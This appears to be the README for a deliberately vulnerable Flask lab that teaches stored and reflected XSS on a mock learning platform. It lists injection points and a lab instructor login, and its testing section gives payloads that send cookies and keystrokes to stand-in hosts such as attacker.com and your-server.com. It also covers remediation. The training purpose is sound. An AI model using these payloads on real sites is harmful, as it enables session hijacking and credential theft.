# SkillForge XSS Lab - Stored XSS Vulnerability Challenge

<div align="center">

![SkillForge Logo](https://img.shields.io/badge/SkillForge-XSS%20Lab-purple?style=for-the-badge)
![Vulnerability](https://img.shields.io/badge/Vulnerability-Stored%20XSS-red?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-yellow?style=for-the-badge)

**A realistic 2026 online learning platform with intentional stored XSS vulnerabilities for CTF training and bug bounty practice.**

</div>

---

## 🎯 Overview

SkillForge is a deliberately vulnerable web application that simulates a modern online learning platform. It features contemporary design patterns, realistic user flows, and **multiple stored XSS vulnerabilities** across different user interaction points for educational purposes.

**⚠️ WARNING: This application is intentionally insecure. NEVER deploy to production or public-facing servers.**

---

## 🏗️ Application Structure

### **Website Features**
- **Modern Homepage** - 2026-style gradients, stats dashboard, feature cards
- **Course Catalog** - 6 online courses with individual detail pages
- **Course Reviews** - Student review submission system with ratings
- **Course Q&A** - Question and answer system for students
- **Instructor Applications** - Become an instructor application form
- **Community Forum** - Public discussion board for learners
- **Platform Feedback** - User feedback submission system
- **Instructor Dashboard** - View all user submissions (XSS execution zone)

### **User Roles**
- **Public Users** - Can browse courses, submit reviews, ask questions, post in forum, submit feedback
- **Instructors** - Can view all submissions in the instructor dashboard

---

## 🔓 Instructor Access

```
URL:      http://localhost:5000/instructor/login
Username: instructor@skillforge.io
Password: Teach2026Secure!
```

---

## 🐛 Vulnerability Breakdown

### **1. Stored XSS in Course Reviews** ⭐⭐
**Location:** `/course/<course_id>/review`  
**Injection Points:**
- `student_name` field
- `review_title` field
- `review_text` field

**Execution Zone:** `/instructor/review/<id>` (instructor views review details)

**How it works:**
1. User submits a course review with XSS payload in any field
2. Data saved to `data/course_reviews.json` without sanitization
3. Instructor views review details in dashboard
4. Template renders with `|safe` filter → XSS executes

**Example Payload:**
```html
<img src=x onerror="alert('XSS in course review')">
```

---

### **2. Stored XSS in Course Q&A** ⭐⭐
**Location:** `/course/<course_id>/ask`  
**Injection Points:**
- `student_name` field
- `question_title` field
- `question_text` field

**Execution Zone:** `/instructor/question/<id>` (instructor views question details)

**How it works:**
1. User submits a question with XSS payload
2. Data saved to `data/course_qa.json` without sanitization
3. Instructor opens question to answer it
4. Template renders with `|safe` filter → XSS executes

**Example Payload:**
```html
<svg onload="alert('XSS in Q&A')">
```

---

### **3. Stored XSS in Instructor Applications** ⭐⭐⭐
**Location:** `/become-instructor/apply`  
**Injection Points:**
- `full_name` field
- `email` field
- `bio` field (textarea)
- `expertise` field
- `linkedin` field
- `portfolio` field
- `teaching_philosophy` field (textarea)

**Execution Zone:** `/instructor/application/<id>` (instructor views application details)

**How it works:**
1. Attacker submits instructor application with XSS payloads
2. Data saved to `data/instructor_applications.json` without sanitization
3. Instructor reviews application in dashboard
4. Template renders with `|safe` filter → XSS executes

**Example Payload:**
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

---

### **4. Stored XSS in Community Forum** ⭐⭐
**Location:** `/community/post`  
**Injection Points:**
- `author` field
- `title` field
- `content` field (textarea)

**Execution Zone:** `/instructor/forum-post/<id>` (instructor moderates forum post)

**How it works:**
1. User creates forum post with XSS payload
2. Data saved to `data/forum_posts.json` without sanitization
3. Instructor views post for moderation
4. Template renders with `|safe` filter → XSS executes

**Example Payload:**
```html
<details open ontoggle="alert('XSS in forum')">
```

---

### **5. Stored XSS in Platform Feedback** ⭐⭐
**Location:** `/feedback/submit`  
**Injection Points:**
- `name` field
- `email` field
- `subject` field
- `message` field (textarea)

**Execution Zone:** `/instructor/feedback/<id>` (instructor views feedback)

**How it works:**
1. User submits platform feedback with XSS payload
2. Data saved to `data/platform_feedback.json` without sanitization
3. Instructor reads feedback to improve platform
4. Template renders with `|safe` filter → XSS executes

**Example Payload:**
```html
<iframe src="javascript:alert('XSS in feedback')">
```

---

### **6. Reflected XSS in Search API** ⭐
**Location:** `/api/search?q=<payload>`  
**Injection Point:** `q` query parameter

**How it works:**
1. API endpoint reflects search query in JSON response
2. No sanitization of the `q` parameter
3. Query is echoed back in `results.query` field

**Example Payload:**
```
http://localhost:5000/api/search?q=<script>alert('Reflected XSS')</script>
```

---

## 🚀 Installation & Setup

### **Requirements**
- Python 3.7+
- Flask 3.0.0
- Werkzeug 3.0.1

### **Installation Steps**

1. **Extract the ZIP file**
```bash
cd C:\Users\Ujwal\Downloads\Local Testing\skillforge-xss-lab
```

2. **Install dependencies**
```bash
pip install -r requirements.txt
```

3. **Run the application**
```bash
python app.py
```

Or double-click `start.bat` (Windows)

4. **Access the application**
```
Main Site:   http://localhost:5000
Instructor:  http://localhost:5000/instructor/login
```

---

## 📂 Project Structure

```
skillforge-xss-lab/
├── app.py                              # Main Flask application
├── requirements.txt                    # Python dependencies
├── start.bat                           # Windows launcher script
├── data/                               # JSON data storage (auto-created)
│   ├── course_reviews.json             # Course reviews
│   ├── course_qa.json                  # Course Q&A posts
│   ├── instructor_applications.json    # Instructor applications
│   ├── forum_posts.json                # Community forum posts
│   └── platform_feedback.json          # Platform feedback
├── templates/                          # Jinja2 templates
│   ├── base.html                       # Base template with navbar/footer
│   ├── index.html                      # Homepage
│   ├── courses.html                    # Course catalog
│   ├── course_detail.html              # Individual course page (with reviews & Q&A)
│   ├── become_instructor.html          # Instructor application form
│   ├── community.html                  # Community forum
│   ├── feedback.html                   # Platform feedback form
│   ├── instructor_login.html           # Instructor login page
│   ├── instructor_dashboard.html       # Instructor dashboard
│   ├── view_review.html                # ⚠️ XSS execution zone
│   ├── view_question.html              # ⚠️ XSS execution zone
│   ├── view_application.html           # ⚠️ XSS execution zone
│   ├── view_forum_post.html            # ⚠️ XSS execution zone
│   └── view_feedback.html              # ⚠️ XSS execution zone
└── README.md                           # This file
```

---

## 🎓 Learning Objectives

### **For Security Researchers**
- Understand stored XSS vs reflected XSS
- Practice identifying XSS injection points in forms
- Learn blind XSS testing techniques (instructor as victim)
- Explore XSS payload variations and bypass techniques
- Practice cookie stealing and session hijacking

### **For Developers**
- Understand why input sanitization is critical
- Learn the risks of Jinja2's `|safe` filter
- See how JSON storage can persist malicious payloads
- Recognize the importance of output encoding
- Understand context-aware XSS prevention

---

## 🧪 Testing Methodology

### **Basic Stored XSS Test**
1. Navigate to any form (course reviews, forum, feedback, etc.)
2. Insert payload: `<script>alert('XSS')</script>`
3. Submit the form
4. Login to instructor dashboard
5. Click "View Details" on your submission
6. Observe XSS execution

### **Advanced Blind XSS**
1. Set up a listener server (e.g., webhook.site, Burp Collaborator)
2. Inject payload that exfiltrates data:
```html
<script>
fetch('https://your-listener.com/?cookie='+document.cookie+'&loc='+window.location);
</script>
```
3. Submit to any vulnerable form
4. Wait for instructor to view it
5. Check your listener for incoming requests with stolen cookies

### **Cookie Stealing Payload**
```html
<script>
document.location='https://your-server.com/steal?c='+document.cookie;
</script>
```

### **Keylogger Payload**
```html
<script>
document.onkeypress=function(e){
  fetch('https://your-server.com/log?key='+e.key);
}
</script>
```

### **DOM Manipulation**
```html
<script>
document.body.innerHTML='<h1>Site Defaced by Researcher</h1>';
</script>
```

---

## 🛡️ How to Fix (Educational)

### **1. Input Sanitization**
```python
from markupsafe import escape

new_review = {
    'student_name': escape(request.form.get('student_name', '')),
    'review_text': escape(request.form.get('review_text', ''))
}
```

### **2. Remove `|safe` Filter**
```html
<!-- Before (vulnerable) -->
{{ review.student_name|safe }}

<!-- After (secure) -->
{{ review.student_name }}
```

### **3. Content Security Policy**
```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response
```

### **4. HTTPOnly Cookies**
```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
```

---

## ⚠️ Ethical Guidelines

### **✅ Acceptable Use**
- Local testing and learning
- Bug bounty practice in controlled environments
- Security training and demonstrations
- Academic research with proper authorization

### **❌ Prohibited Actions**
- Deploying to public-facing servers
- Testing on systems without authorization
- Using techniques on production applications
- Sharing with individuals who may misuse the knowledge

---

## 🏆 CTF Challenge Ideas

1. **Challenge 1:** Find all 6 XSS vulnerabilities (5 stored + 1 reflected)
2. **Challenge 2:** Exfiltrate instructor session cookie via blind XSS
3. **Challenge 3:** Craft a payload that bypasses client-side validation
4. **Challenge 4:** Demonstrate persistent XSS across multiple page views
5. **Challenge 5:** Chain XSS with other vulnerabilities (if any exist)

---

## 📝 Bug Report Template

```markdown
**Vulnerability:** Stored Cross-Site Scripting (XSS)

**Severity:** High

**Location:** /course/<course_id>/review

**Affected Parameters:** student_name, review_title, review_text

**Description:**
The application does not sanitize user input in the course review form,
allowing an attacker to inject arbitrary JavaScript that executes when an
instructor views the review details in the dashboard.

**Steps to Reproduce:**
1. Navigate to any course page (e.g., /course/web-development-masterclass)
2. Scroll to the "Share Your Experience" review form
3. In the "Your Name" field, enter: <script>alert('XSS')</script>
4. Fill in other required fields normally
5. Submit the review
6. Login as instructor (instructor@skillforge.io / Teach2026Secure!)
7. Navigate to Instructor Dashboard
8. Click "View Details" on the malicious review
9. Observe JavaScript execution

**Impact:**
- Session hijacking via cookie theft
- Keylogging and credential theft
- Unauthorized actions as instructor
- Defacement of instructor dashboard
- Full account takeover potential

**Remediation:**
1. Sanitize all user inputs using `markupsafe.escape()`
2. Remove `|safe` filter from templates
3. Implement Content Security Policy (CSP)
4. Add HTTPOnly flag to session cookies
5. Implement input validation on server-side
```

---

## 🔗 Additional Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [HackerOne XSS Reports](https://hackerone.com/hacktivity?querystring=XSS)
- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)

---

## 📜 License

This project is for **educational purposes only**. Use responsibly and ethically.

**Created:** August 2026  
**Author:** CTF Lab Series  
**Version:** 1.0.0

---

<div align="center">

**⚠️ REMEMBER: Only test on systems you own or have explicit permission to test. ⚠️**

</div>
